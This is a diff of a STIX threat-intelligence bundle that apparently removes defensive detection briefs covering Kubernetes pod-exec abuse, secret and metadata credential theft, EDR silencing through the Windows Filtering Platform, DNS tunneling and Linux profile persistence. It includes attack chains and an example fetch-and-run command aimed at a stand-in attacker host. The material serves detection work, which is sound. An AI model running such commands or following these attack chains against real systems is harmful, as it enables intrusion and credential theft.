-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--43d38394-f057-5638-956c-7f0c9ff4e7cc",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-24T18:03:00.000Z",
@@ -18689,60 +18272,6 @@
         "status": "unknown"
       },
       "x_craftedsignal_cvss_max": 7.5,
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
-      "id": "report--471f132a-4ec9-5ed2-b078-0675955bb356",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:40.000Z",
-      "modified": "2026-08-24T15:47:40.000Z",
-      "name": "Detecting Malicious Ingress Tool Transfer via Kubernetes Pod Exec",
-      "description": "## Overview\n\nAttackers with unauthorized or compromised access to Kubernetes environments frequently leverage the `exec` subresource of the Kubernetes API to interact with containerized workloads. By initiating an `exec` call, an attacker can execute arbitrary commands directly within the container namespace. A common post-exploitation pattern involves utilizing native binaries like `curl` or `wget` to fetch remote payloads, stage additional tooling, or exfiltrate sensitive data over HTTPS. This activity often bypasses standard network perimeter controls if the pod has egress connectivity to the internet. This detection brief focuses on monitoring Kubernetes API server audit logs to identify these specific command patterns, reconstructing the URL-encoded request URI to provide defenders with the exact command executed inside the pod, while filtering out benign cluster-internal traffic such as health checks and OIDC configuration lookups.\n\n## Attack Chain\n\n1. Attacker gains initial access to a Kubernetes principal (e.g., service account or user token) with `pods/exec` RBAC permissions.\n2. Attacker enumerates target namespaces and pods using `kubectl get pods` or similar discovery commands.\n3. Attacker initiates a `pods/exec` request against a target pod via the Kubernetes API server.\n4. The request URI, containing the command (e.g., `curl https://attacker-c2.com/script.sh | sh`), is transmitted to the API server.\n5. The API server logs the exec request in the cluster audit log.\n6. The `curl` or `wget` utility executes inside the container, initiating an HTTPS connection to the external C2 or staging server.\n7. The attacker stages secondary payloads, malicious scripts, or exfiltrates data from the pod environment.\n\n## Impact\n\nSuccessful exploitation of `pods/exec` for ingress tool transfer can lead to full compromise of the container environment, lateral movement within the cluster, and exfiltration of sensitive pod-accessible data, such as environment variables, mounted secrets, or cloud metadata.\n\n## Recommendation\n\nDetection engineers should focus on auditing and monitoring Kubernetes API server logs for anomalous execution patterns.\n\n- Implement the provided detection logic to identify `exec` calls involving `curl` or `wget` to HTTPS URLs in your SIEM.\n- Review RBAC policies across the cluster to ensure the `pods/exec` permission is restricted to authorized administrative or CI/CD identities.\n- Baseline common administrative access patterns to identify outliers in the `user.name` or `source.ip` fields in audit logs.\n- Regularly audit pod filesystem contents and container images to ensure no unauthorized persistence mechanisms or dropped tools are present.\n",
-      "published": "2026-08-24T15:47:40.000Z",
-      "labels": [
-        "c2",
-        "cloud",
-        "execution",
-        "kubernetes"
-      ],
-      "object_refs": [
-        "attack-pattern--942c509a-a6cb-5ec1-bdbc-488dbadf021d",
-        "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "software--84749115-8769-525a-a86c-6be2d5067e1d"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-k8s-pod-exec-curl-wget",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-pod-exec-curl-wget/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://attack.mitre.org/techniques/T1105/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://attack.mitre.org/techniques/T1609/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/kubernetes/execution_kubernetes_pod_exec_curl_wget_https.toml"
-        }
-      ],
-      "confidence": 80,
-      "x_craftedsignal_brief_id": "brief-2026-08-k8s-pod-exec-curl-wget",
-      "x_craftedsignal_event_id": "brief-2026-08-k8s-pod-exec-curl-wget",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-pod-exec-curl-wget/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:47:40.000Z",
-      "x_craftedsignal_severity": "high",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
       "x_craftedsignal_kev_status": "unknown"
     },
     {
@@ -19651,54 +19180,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--534dae19-3c1c-56ab-bd62-5add9b9d27d5",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:48:23.000Z",
-      "modified": "2026-08-24T15:48:23.000Z",
-      "name": "Suspicious Linux /proc/*/maps File Discovery",
-      "description": "## Overview\n\nMonitoring access to the /proc/[pid]/maps file is critical for detecting memory-based reconnaissance on Linux systems. This pseudo-file provides a comprehensive map of a process's memory layout, including addresses, permissions, and backing files. Sophisticated attackers exploit this information to identify memory locations suitable for code injection or to facilitate process hijacking. Furthermore, the information contained in memory maps is often leveraged during the credential dumping phase, where adversaries search for sensitive data residing within process memory.\n\nThe activity is frequently observed during the early stages of an intrusion to gain environmental awareness. While legitimate system diagnostics, security agents, and debugging tools also access these files, malicious use typically involves common command-line utilities (such as cat, grep, or awk) executed from interactive shells or unauthorized automated scripts. Defenders must baseline legitimate administrative and security software in their environment to minimize noise when alerting on this behavior.\n\n## Impact\n\nSuccessful reconnaissance of process memory maps provides adversaries with the necessary context to perform advanced exploitation techniques. If attackers effectively map process memory, they can bypass security controls to conduct reliable process injection, execute fileless payloads, or target specific memory segments containing plaintext credentials or cryptographic material. This technique is often used in lateral movement and persistence phases of an attack.\n\n## Recommendation\n\n- Deploy the Sigma rules below to monitor for process execution patterns accessing the /proc filesystem.\n- Establish a comprehensive allowlist for known security tools, system diagnostics, and administrative maintenance scripts that legitimately interface with /proc/*/maps.\n- Implement strict process execution policies to limit which user-mode applications can trigger file-read operations on sensitive /proc entries.\n- Conduct regular memory analysis on high-value systems to detect evidence of injected code or unauthorized modifications identified via memory map reconnaissance.\n",
-      "published": "2026-08-24T15:48:23.000Z",
-      "labels": [
-        "discovery",
-        "linux",
-        "memory-reconnaissance"
-      ],
-      "object_refs": [
-        "attack-pattern--633c0a79-a71b-5eb7-9eca-504796091337",
-        "attack-pattern--b2ef40df-6911-5059-85e1-8e863224f8cd",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-proc-maps-discovery",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-proc-maps-discovery/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://github.com/arget13/DDexec"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_proc_maps_read.toml"
-        }
-      ],
-      "confidence": 80,
-      "x_craftedsignal_brief_id": "brief-2026-08-proc-maps-discovery",
-      "x_craftedsignal_event_id": "brief-2026-08-proc-maps-discovery",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-proc-maps-discovery/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:48:23.000Z",
-      "x_craftedsignal_severity": "high",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--54e448da-82e1-5cbf-954a-b03efd5b767c",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-31T11:17:52.000Z",
@@ -20570,58 +20051,6 @@
         "status": "unknown"
       },
       "x_craftedsignal_cvss_max": 8.1,
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
-      "id": "report--60be7a56-8c94-5f5d-b036-b894b8c5c79e",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:32.000Z",
-      "modified": "2026-08-24T15:47:32.000Z",
-      "name": "Kubernetes Secret Access by Node or Pod Identities",
-      "description": "## Overview\n\nKubernetes environments face significant risk from credential access techniques where compromised pod service accounts or node identities (kubelet) are used to query the Kubernetes API for sensitive secrets. Because these identities are meant to operate with predictable, limited API access, direct enumeration of 'Secrets' objects is highly anomalous. Attackers utilize these stolen tokens or node credentials to sweep the cluster for registry credentials, TLS certificates, private keys, and application configuration. This behavior is particularly dangerous as it enables lateral movement and privilege escalation. While some legitimate in-cluster controllers perform these actions, unauthorized use by service accounts or nodes - especially those originating from non-local IP addresses - indicates malicious intent to access protected material. Defensive teams must monitor Kubernetes API server audit logs to detect these unauthorized read operations.\n\n## Impact\n\nSuccessful exploitation allows attackers to bypass security boundaries and exfiltrate sensitive data stored within Kubernetes Secrets. This can lead to full cluster compromise, unauthorized access to external services through exposed registry credentials, and the potential for persistent backdoors. The scope of impact includes any workload, infrastructure component, or secret managed within the cluster namespace.\n\n## Recommendation\n\n* Deploy the Sigma rules provided in this brief to detect unauthorized 'get' or 'list' requests on the Secrets API from nodes and service accounts.\n* Establish a baseline for legitimate service account activity to identify anomalous user agents, namespace access, or resource requests.\n* Implement least-privilege RBAC policies, ensuring that service accounts and node identities only have access to the specific secrets required for their function.\n* Monitor Kubernetes audit logs for `authorization_k8s_io/decision` field values that indicate denied access attempts, as these serve as early warning signs of discovery activity.\n* Rotate credentials and revoke tokens immediately upon detecting unauthorized secret enumeration.\n",
-      "published": "2026-08-24T15:47:32.000Z",
-      "labels": [
-        "cloud",
-        "credential-access",
-        "kubernetes"
-      ],
-      "object_refs": [
-        "attack-pattern--dc5e4f03-1094-5965-8de6-b9af854b1653",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "software--84749115-8769-525a-a86c-6be2d5067e1d"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-k8s-secret-access",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-secret-access/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://attack.mitre.org/techniques/T1552/007/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/kubernetes/credential_access_kubernetes_secret_read_by_node_or_pod_service_account.toml"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-k8s-secret-access",
-      "x_craftedsignal_event_id": "brief-2026-08-k8s-secret-access",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-secret-access/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:47:32.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
       "x_craftedsignal_kev_status": "unknown"
     },
     {
@@ -24306,44 +23735,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--8f6cd496-6253-5784-9c73-0f19519d7753",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:36.000Z",
-      "modified": "2026-08-24T15:46:36.000Z",
-      "name": "Abuse of Windows Filtering Platform to Disable EDR Telemetry",
-      "description": "## Overview\n\nAdversaries are increasingly abusing the Windows Filtering Platform (WFP) to disrupt the operations of security products. Tools such as EDRSilencer leverage the legitimate capabilities of WFP to dynamically inject filter rules that explicitly block outbound network traffic originating from security agent processes. By creating these block filters, attackers can effectively disable the reporting functionality of EDRs, antivirus solutions, and logging agents without needing to terminate the processes themselves. This technique allows for stealthier persistence of malicious activity, as the security agent remains active in the process list but fails to communicate threat telemetry to central consoles. Defenders must monitor WFP policy modifications for unauthorized block rules targeting security binaries to mitigate this evasion technique.\n\n## Attack Chain\n\n1. The attacker gains administrative or elevated privileges on the target Windows system.\n2. The attacker deploys a tool, such as EDRSilencer, capable of interacting with the Windows Filtering Platform API.\n3. The tool enumerates running processes to identify security agents (e.g., MsMpEng.exe, xagt.exe, CylanceSvc.exe).\n4. The tool constructs a WFP filter rule designed to drop network packets associated with the identified target processes.\n5. The tool interacts with the WFP engine via administrative APIs to commit the new filter rule with a \"Block\" action.\n6. The target EDR process continues to run but is prevented from transmitting telemetry to its cloud or management server.\n7. The attacker conducts follow-on malicious activity while the EDR remains effectively silenced.\n\n## Impact\n\nSuccessful abuse of this technique results in the complete loss of visibility into host-based security telemetry. By silencing agents, an attacker can operate on an endpoint undetected, potentially leading to unauthorized data exfiltration, lateral movement, or ransomware deployment without triggering standard security alerts.\n\n## Recommendation\n\n* Enable Windows Security Event Log auditing for Event ID 5447 (Windows Filtering Platform) to capture WFP policy changes.\n* Deploy the Sigma rules below to identify the creation of block filters targeting known security processes.\n* Establish a baseline for authorized administrative tools that modify WFP filters; investigate any processes outside of this baseline performing such actions.\n* Integrate Event ID 5447 into your SIEM monitoring to alert on any WFP rule addition with a \"Block\" action.\n",
-      "published": "2026-08-24T15:46:36.000Z",
-      "labels": [
-        "defense-evasion",
-        "edr-silencing",
-        "windows-filtering-platform"
-      ],
-      "object_refs": [
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-wfp-edr-silencing",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-wfp-edr-silencing/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-wfp-edr-silencing",
-      "x_craftedsignal_event_id": "brief-2026-08-wfp-edr-silencing",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-wfp-edr-silencing/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:46:36.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--90caffeb-eb6b-5127-9a6a-0718af9addd2",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-29T19:41:11.000Z",
@@ -24435,46 +23826,6 @@
       },
       "x_craftedsignal_cvss_max": 5.9,
       "x_craftedsignal_epss_max": 0.00493,
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
-      "id": "report--9106dc60-7c28-5e94-90e4-42d533a33cb7",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:53.000Z",
-      "modified": "2026-08-24T15:46:53.000Z",
-      "name": "Detection of Excessive nslookup.exe Usage for Data Exfiltration",
-      "description": "## Overview\n\nExcessive usage of the native Windows binary 'nslookup.exe' often serves as a primary indicator of DNS tunneling, a technique where attackers encapsulate non-DNS traffic within DNS queries to bypass network perimeters. This behavior is frequently associated with APT groups and malware strains looking to exfiltrate sensitive data or maintain persistent C2 channels in restricted environments. Because nslookup.exe is a legitimate administrative tool, detection relies on identifying statistical outliers in execution frequency rather than simple presence detection. Defenders should establish baselines for nslookup activity across their endpoint fleet to distinguish malicious exfiltration from legitimate network monitoring, load balancer health checks, and scheduled DNS diagnostic scripts.\n\n## Impact\n\nSuccessful DNS tunneling allows attackers to bypass traditional data loss prevention (DLP) and firewall egress filtering rules, enabling the stealthy exfiltration of sensitive information or the receipt of commands from remote infrastructure. Organizations failing to monitor for this anomaly risk data breaches and undetected persistent access by sophisticated threat actors.\n\n## Recommendation\n\n* Deploy the provided Sigma rule to your SIEM to monitor for statistically significant spikes in nslookup.exe process creation.\n* Enable Sysmon Event ID 1 or Windows Event ID 4688 to capture the required process-creation telemetry.\n* Baseline the typical volume of nslookup activity in your environment, paying specific attention to automated network monitoring tools and load-balancing scripts to reduce false positives.\n* Investigate endpoints that trigger the alert by reviewing the parent process of nslookup.exe to determine if the activity originated from a trusted administrator tool or an unknown, potentially malicious process.\n",
-      "published": "2026-08-24T15:46:53.000Z",
-      "labels": [
-        "anomaly",
-        "command-and-control",
-        "dns-exfiltration",
-        "endpoint-security"
-      ],
-      "object_refs": [
-        "attack-pattern--6ef3c5ca-94f5-57f2-924a-8c2f91b71d40",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-excessive-nslookup",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-excessive-nslookup/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-excessive-nslookup",
-      "x_craftedsignal_event_id": "brief-2026-08-excessive-nslookup",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-excessive-nslookup/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:46:53.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
       "x_craftedsignal_kev_status": "unknown"
     },
     {
@@ -26247,46 +25598,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--ab6ca67f-2bb1-52e8-9850-cca4bb7485e6",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:08.000Z",
-      "modified": "2026-08-24T15:46:08.000Z",
-      "name": "Detection of Malicious Linux Profile Modification for Persistence",
-      "description": "## Overview\n\nAdversaries targeting Linux environments often seek to establish persistence by modifying startup configuration files. This technique involves appending malicious commands, scripts, or binary paths into common shell initialization files such as ~/.bashrc, ~/.bash_profile, or /etc/profile. By successfully modifying these files, an attacker ensures that their arbitrary code executes with the privileges of the user who logs in, or the system account during boot, facilitating long-term access and potential privilege escalation.\n\nSecurity operations centers must monitor for processes that perform write operations to these sensitive configuration files, particularly when initiated by utilities like 'echo' or redirect operators. While legitimate system administration tasks may involve these commands, the lack of expected administrative context or unusual patterns of modification can serve as a strong indicator of compromise. This activity is a classic method for maintaining a foothold in a Linux environment and is commonly associated with broader persistence and post-exploitation objectives.\n\n## Attack Chain\n\n1. Initial access is gained on the Linux target system (e.g., via web shell or remote exploitation).\n2. The attacker identifies shell profile files (e.g., ~/.bashrc or /etc/profile) to target for persistence.\n3. The attacker utilizes standard utilities like 'echo' or 'printf' to generate malicious command strings.\n4. The attacker uses file redirection operators ('\u003e' or '\u003e\u003e') to append the generated command strings into the target profile file.\n5. The system saves the modified configuration file, embedding the malicious payload into the startup environment.\n6. The attacker waits for a user to initiate a login session or for the system to reboot.\n7. The shell or init process reads the modified profile file and executes the appended malicious command.\n8. The attacker regains execution control on the host, achieving persistent access.\n\n## Impact\n\nSuccessful modification of profile files allows attackers to execute arbitrary code with elevated privileges, potentially leading to total system compromise, exfiltration of sensitive data, and further lateral movement within the network. This technique is a high-reward objective for actors aiming for long-term presence on targeted infrastructure.\n\n## Recommendation\n\n- Deploy the provided Sigma rule to your SIEM and tune the filter macros to exclude legitimate administrative activity.\n- Enable process-creation logging (e.g., via Sysmon for Linux or auditd) to ensure the full command line is captured for all process executions.\n- Perform regular integrity monitoring on sensitive Linux configuration files, such as ~/.bashrc and /etc/profile, to detect unauthorized modifications.\n- Correlate process creation events targeting profile files with parent process metadata to identify unauthorized or anomalous parent-child relationships.\n",
-      "published": "2026-08-24T15:46:08.000Z",
-      "labels": [
-        "e-d-r",
-        "linux",
-        "persistence",
-        "privilege-escalation"
-      ],
-      "object_refs": [
-        "attack-pattern--1c2f2ef4-96d1-5f02-86f0-bf0721251ef2",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-linux-profile-modification",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-linux-profile-modification/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-linux-profile-modification",
-      "x_craftedsignal_event_id": "brief-2026-08-linux-profile-modification",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-linux-profile-modification/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:46:08.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--acb300c6-e57a-5e2b-a91a-66b4d7dceaa3",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-29T21:41:54.000Z",
@@ -27452,54 +26763,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--b9ff0822-1f28-5c3f-b386-0d53c835e85c",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:03.000Z",
-      "modified": "2026-08-24T15:47:03.000Z",
-      "name": "Kubernetes Pod Exec Exploitation of Cloud Instance Metadata",
-      "description": "## Overview\n\nUnauthorized access to cloud instance metadata services via Kubernetes (K8s) containers is a significant security risk in multi-tenant and regulated environments. Adversaries who gain access to a K8s cluster and successfully perform a pod exec operation can abuse this capability to interact with link-local IP addresses (e.g., 169.254.169.254) or cloud-provider specific hostnames. By targeting AWS IMDS, GCP computeMetadata, or Azure IMDS, attackers can exfiltrate sensitive data, including temporary IAM role credentials, OAuth tokens, and instance metadata. This technique allows an attacker to pivot from a compromised container to the underlying node identity, potentially leading to widespread privilege escalation across the cloud environment. Defenders must monitor Kubernetes API audit logs for suspicious exec request patterns that include metadata-related strings.\n\n## Attack Chain\n\n1. Attacker gains initial access to the Kubernetes cluster through an exploited service or compromised pod.\n2. Attacker identifies a high-value pod that has access to the cloud environment or elevated IAM permissions.\n3. Attacker uses the `kubectl exec` API to execute commands within the context of the targeted container.\n4. Attacker crafts a command-line string (e.g., `curl` or `wget`) pointing to cloud provider metadata endpoints.\n5. The containerized process transmits an HTTP request to the metadata service (e.g., 169.254.169.254) from within the K8s pod network.\n6. The metadata service returns temporary credentials, tokens, or instance attributes to the container.\n7. Attacker captures and exfiltrates the returned credentials to a remote command-and-control server.\n8. Attacker uses the stolen credentials to authenticate to cloud APIs and achieve unauthorized data access or persistence.\n\n## Impact\n\nSuccessful exploitation allows attackers to bypass container isolation and assume the identity of the underlying cloud instance profile. This typically leads to full credential compromise for the associated IAM role, facilitating lateral movement into cloud infrastructure, data exfiltration from storage buckets, or the modification of infrastructure settings within AWS, GCP, or Azure environments.\n\n## Recommendation\n\n- Implement network policies that strictly deny pod access to the cloud metadata service IP (169.254.169.254) and other internal cloud service hostnames.\n- Audit all uses of `kubectl exec` within the cluster to baseline administrative behavior and identify anomalous requests.\n- Enable Kubernetes API server audit logging and ingest these logs into a SIEM for detection and correlation.\n- Review IAM roles associated with K8s nodes and minimize the scope of permissions to follow the principle of least privilege.\n- Deploy detection logic focused on command-line arguments within audit logs that reference metadata service paths, as provided in the detection section below.\n",
-      "published": "2026-08-24T15:47:03.000Z",
-      "object_refs": [
-        "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27",
-        "attack-pattern--dc5e4f03-1094-5965-8de6-b9af854b1653",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "indicator--01f95490-ba46-5442-9779-26edd8899617",
-        "indicator--9d1eb90a-7157-5602-8b33-fd52411f02b8",
-        "software--2f2208c4-4258-54d8-9c45-23af6a88707c",
-        "software--da9a48da-4482-5a99-8bcd-dccfef835054",
-        "software--e778ce89-de06-530b-805f-85bc5a5049e2"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-k8s-pod-exec-metadata",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-pod-exec-metadata/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://attack.mitre.org/techniques/T1552/005/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://hardenedsecurity.io/blog/aws-imds-vulnerabilities-and-mitigations/"
-        }
-      ],
-      "confidence": 80,
-      "x_craftedsignal_brief_id": "brief-2026-08-k8s-pod-exec-metadata",
-      "x_craftedsignal_event_id": "brief-2026-08-k8s-pod-exec-metadata",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-pod-exec-metadata/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:47:03.000Z",
-      "x_craftedsignal_severity": "high",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--ba9b3e54-5b94-5139-abad-06afb40fcd76",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-25T06:05:39.000Z",
@@ -28080,49 +27343,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--c0e8142c-9502-579a-8002-af44b0691d96",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:12.000Z",
-      "modified": "2026-08-24T15:47:12.000Z",
-      "name": "Kubernetes Pod Exec Sensitive File Access Detection",
-      "description": "## Overview\n\nThis alert addresses the abuse of the Kubernetes pod exec API to perform reconnaissance and credential theft. Attackers often leverage legitimate administrative access to interactively or programmatically access sensitive files within a container. This activity frequently precedes lateral movement or privilege escalation. The scope includes access to high-value targets such as mounted service account tokens (including IRSA and Workload Identity), host configuration files (/etc/shadow, /etc/passwd), private keys, keystores, and process environment variables that may contain secrets. The detection focuses on auditing Kubernetes API server logs for exec commands that reference these sensitive paths. Defending against this requires strict RBAC controls for the exec subresource and robust monitoring of audit logs for anomalous administrative access patterns.\n\n## Attack Chain\n\n1. Attacker gains initial access to a Kubernetes cluster via compromised credentials or a vulnerable workload.\n2. Attacker enumerates pods and containers to identify targets with sufficient privileges or sensitive mounts.\n3. Attacker uses the 'kubectl exec' command or direct Kubernetes API calls to initiate an interactive session inside a container.\n4. Attacker executes commands (e.g., cat, grep, ls) to probe for sensitive files or credential material in the container filesystem.\n5. Attacker accesses high-value targets such as /var/run/secrets/kubernetes.io/serviceaccount/token or cloud-provider identity tokens.\n6. Attacker exfiltrates discovered credentials or tokens to gain higher-level access to the cluster or cloud control plane.\n7. Attacker performs further actions such as secret dumping, RBAC modifications, or container breakout to achieve final objectives.\n\n## Impact\n\nSuccessful exploitation of this technique allows an attacker to steal identity tokens, compromise service accounts, gain persistent access to the Kubernetes control plane, or escalate privileges within the cloud environment. Depending on the stolen credentials, this can lead to full cluster compromise or unauthorized access to external cloud resources (AWS, Azure, GCP).\n\n## Recommendation\n\nPrioritized, concrete actions for detection engineering teams:\n- Deploy the ESQL detection logic to the SIEM and validate against existing audit logs.\n- Implement RBAC controls to restrict 'exec' permissions to only necessary users and automated service identities.\n- Review all pods with 'hostPath' mounts or privileged security contexts as these are primary targets for credential exfiltration.\n- Establish baseline monitoring for stable automation identities to reduce false positives from diagnostic or monitoring agents.\n",
-      "published": "2026-08-24T15:47:12.000Z",
-      "labels": [
-        "cloud",
-        "credential-access",
-        "kubernetes",
-        "pod-exec",
-        "threat-detection"
-      ],
-      "object_refs": [
-        "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27",
-        "attack-pattern--dc5e4f03-1094-5965-8de6-b9af854b1653",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "software--84749115-8769-525a-a86c-6be2d5067e1d"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-k8s-pod-exec-credential-access",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-pod-exec-credential-access/"
-        }
-      ],
-      "confidence": 80,
-      "x_craftedsignal_brief_id": "brief-2026-08-k8s-pod-exec-credential-access",
-      "x_craftedsignal_event_id": "brief-2026-08-k8s-pod-exec-credential-access",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-pod-exec-credential-access/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:47:12.000Z",
-      "x_craftedsignal_severity": "high",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--c15c0e25-1894-538d-9163-2ea6ce3ad1e9",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-31T13:59:05.000Z",
@@ -28494,44 +27714,6 @@
       },
       "x_craftedsignal_cvss_max": 8.8,
       "x_craftedsignal_epss_max": 0.01699,
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
